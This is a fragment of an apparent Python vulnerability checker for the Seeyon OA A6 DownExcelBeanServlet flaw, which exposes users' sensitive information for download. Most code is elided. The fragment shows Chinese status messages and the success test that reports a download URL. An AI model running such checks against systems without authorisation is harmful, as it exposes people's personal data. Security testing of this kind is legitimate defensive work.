...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞")
    ...
    try:
        ...
        if "@" in response.text and response.status_code == 200:
            print(
                now_time() + " [SUCCESS]  目标存在致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞, 下载地址: {}".format(
                    vuln_url))
        else:
            print(now_time() + " [WARNING]  致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞利用失败")
    except:
